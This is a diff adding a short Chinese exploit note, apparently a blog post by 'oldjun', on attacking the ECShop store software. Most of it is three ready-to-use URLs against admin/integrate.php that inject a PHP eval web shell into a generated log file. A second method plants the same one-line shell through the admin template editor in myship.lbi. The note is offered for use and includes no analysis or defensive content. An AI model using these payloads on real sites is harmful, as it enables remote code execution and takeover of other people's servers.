@@ -1,0 +1,10 @@
+利用方法：
+http://www.oldjun.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
+http://www.oldjun.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
+http://www.oldjun.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>
+
+三个链接，随便输入一个就可以了，生成http://www.oldjun.com/data/integrate__log.php，就是一句话小马了~
+Posted by oldjun
+肉丝提供的方法如下：
+在“模板管理”-》“库项目管理”，然后选择myship.lbi，在模板里面随便插入一句话小马，再连接http://www.target.com/myship.php文件就可以
+ECshop的smarty模板机制是允许直接执行php代码的
